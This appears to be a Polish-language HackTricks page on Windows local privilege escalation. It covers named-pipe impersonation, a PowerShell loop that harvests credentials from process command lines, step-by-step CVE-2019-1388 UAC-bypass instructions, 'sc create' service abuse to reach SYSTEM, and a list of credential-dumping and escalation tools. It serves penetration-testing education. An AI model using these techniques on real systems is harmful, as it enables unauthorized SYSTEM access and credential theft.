## Impersonacja klienta nazwanego potoku

Segmenty pamięci współdzielone, zwane **potokami**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję o nazwie **Nazwane Potoki**, która umożliwia niepowiązanym procesom współdzielenie danych, nawet przez różne sieci. Przypomina to architekturę klient/serwer, gdzie role są określane jako **serwer potoku nazwanego** i **klient potoku nazwanego**.

Kiedy dane są wysyłane przez **klienta** przez potok, **serwer**, który utworzył potok, ma możliwość **przyjęcia tożsamości** **klienta**, o ile ma odpowiednie uprawnienia **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się za pomocą potoku, który możesz naśladować, daje możliwość **uzyskania wyższych uprawnień**, przyjmując tożsamość tego procesu po interakcji z utworzonym przez ciebie potokiem. Instrukcje dotyczące przeprowadzenia takiego ataku można znaleźć [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](./#from-high-integrity-to-system).

Ponadto, narzędzie o nazwie **pipe-intercept** pozwala na **przechwytywanie komunikacji przez nazwane potoki za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept), a to narzędzie pozwala na wyświetlanie i przeglądanie wszystkich potoków w celu znalezienia podwyższenia uprawnień [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Różne

### **Monitorowanie linii poleceń w celu przechwytywania haseł**

Podczas uzyskiwania powłoki jako użytkownik, mogą być wykonywane zaplanowane zadania lub inne procesy, które **przekazują poświadczenia w linii poleceń**. Poniższy skrypt przechwytuje linie poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (za pośrednictwem konsoli lub RDP) i UAC jest włączone, w niektórych wersjach systemu Microsoft Windows można uruchomić terminal lub dowolny inny proces, tak jak "NT\AUTHORITY SYSTEM" z nieuprzywilejowanego użytkownika.

Dzięki temu możliwe jest eskalowanie uprawnień i jednoczesne obejście UAC za pomocą tej samej podatności. Dodatkowo, nie ma potrzeby instalowania czegokolwiek, a używany podczas procesu plik binarny jest podpisany i wydany przez firmę Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Kliknij prawym przyciskiem myszy na pliku HHUPD.EXE i uruchom go jako Administrator.

2) Po pojawieniu się monitu UAC, wybierz "Pokaż więcej szczegółów".

3) Kliknij "Pokaż informacje o certyfikacie wydawcy".

4) Jeśli system jest podatny, po kliknięciu na link URL "Wydane przez" może pojawić się domyślna przeglądarka internetowa.

5) Poczekaj, aż strona zostanie w pełni załadowana, a następnie wybierz "Zapisz jako", aby otworzyć okno explorer.exe.

6) W ścieżce adresu okna eksploratora wprowadź cmd.exe, powershell.exe lub dowolny inny proces interaktywny.

7) Teraz będziesz miał wiersz polecenia "NT\AUTHORITY SYSTEM".

8) Pamiętaj, aby anulować instalację i monit UAC, aby powrócić do pulpitu.
```

Wszystkie niezbędne pliki i informacje znajdują się w następującym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388

## Od poziomu Administratora do wysokiego poziomu integralności / ominięcie UAC

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i ominięciach UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Od wysokiego poziomu integralności do Systemu**

### **Nowa usługa**

Jeśli już działasz w procesie o wysokim poziomie integralności, **przejście do SYSTEMU** może być łatwe poprzez **utworzenie i uruchomienie nowej usługi**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Z procesu o wysokim poziomie zaufania możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** odwróconą powłokę za pomocą opakowania _.msi_.\
[Więcej informacji na temat zaangażowanych kluczy rejestru i sposobu instalacji pakietu _.msi_ znajdziesz tutaj.](./#alwaysinstallelevated)

### Wysoki poziom + uprzywilejowanie SeImpersonate do Systemu

**Kod można znaleźć tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do pełnych uprawnień tokena

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz je w procesie o już wysokim poziomie zaufania), będziesz mógł **otworzyć prawie każdy proces** (oprócz chronionych procesów) z uprawnieniami SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Zwykle używa się tej techniki, aby **wybrać dowolny proces działający jako SYSTEM z wszystkimi uprawnieniami tokena** (_tak, można znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**Przykład kodu wykonującego proponowaną technikę można znaleźć tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Nazwane potoki**

Ta technika jest używana przez meterpreter do eskalacji w `getsystem`. Technika polega na **utworzeniu potoku, a następnie utworzeniu/zużyciu usługi do zapisu na tym potoku**. Następnie **serwer**, który utworzył potok, używając uprawnienia **`SeImpersonate`**, będzie mógł **udawać token** klienta potoku (usługi), uzyskując uprawnienia SYSTEMU.\
Jeśli chcesz [**dowiedzieć się więcej o nazwanych potokach, powinieneś przeczytać to**](./#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**jak przejść z wysokiego poziomu zaufania do Systemu, używając nazwanych potoków, powinieneś przeczytać to**](from-high-integrity-to-system-with-name-pipes.md).

### Przechwytywanie Dll

Jeśli uda ci się **przechwycić dll**, które jest **ładowane** przez **proces** działający jako **SYSTEM**, będziesz mógł wykonać dowolny kod z tymi uprawnieniami. Dlatego przechwytywanie Dll jest również przydatne do tego rodzaju eskalacji uprawnień, a ponadto, jest znacznie **łatwiejsze do osiągnięcia z procesu o wysokim poziomie zaufania**, ponieważ będzie miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Możesz dowiedzieć się więcej o przechwytywaniu Dll tutaj**](dll-hijacking.md)**.**

### **Od Administratora lub Network Service do Systemu**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Od usługi lokalnej lub usługi sieciowej do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki wykonywalne impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania wektorów eskalacji uprawnień lokalnych w systemie Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdź konfigurację i wrażliwe pliki (**[**sprawdź tutaj**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdź niektóre możliwe konfiguracje i zbieraj informacje (**[**sprawdź tutaj**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdź konfigurację**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia informacje o sesjach zapisanych w PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia poświadczenia z Menedżera poświadczeń. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozpryskuj zgromadzone hasła w całej domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do podszywania się pod ADIDNS/LLMNR/mDNS/NBNS i ataku typu man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe wyliczanie uprawnień Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Wyszukaj znane podatności eskalacji uprawnień (NIEAKTUALNE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne sprawdzenia **(wymaga uprawnień administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukaj znane podatności eskalacji uprawnień (wymaga kompilacji za pomocą VisualStudio) ([**prekompilowane**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Wylicza konfigurację hosta (więcej narzędzie do zbierania informacji niż eskalacji uprawnień) (wymaga kompilacji) **(**[**prekompilowane**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia poświadczenia z wielu programów (prekompilowane exe na githubie)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Sprawdź konfigurację (wykonywalne prekompilowane na githubie). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdź możliwe konfiguracje (exe z pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego postu (nie wymaga accesschk, aby działać poprawnie, ale może go używać).

**Lokalne**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik polecenia **systeminfo** i zaleca działające wykorzystania (lokalne python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik polecenia **systeminfo** i zaleca działające wykorzystania (lokalne python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Musisz skompilować projekt, używając odpowiedniej wersji .NET ([zobacz to](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary, możesz użyć polecenia:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium** [**hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
